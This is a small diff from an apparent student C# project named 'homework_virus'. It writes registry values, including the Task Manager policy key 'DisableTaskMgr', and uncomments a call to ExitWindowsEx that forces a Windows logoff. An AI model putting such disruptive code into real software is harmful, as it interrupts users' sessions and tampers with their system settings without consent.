@@ -22,7 +22,7 @@ namespace homework_virus
             show_task.SetValue("Settings", 1);
             show_task.SetValue("DisableTaskMgr", 0);
 
-           // ExitWindowsEx(0, 0);
+            ExitWindowsEx(0, 0);
 
         }
         [DllImport("user32")]
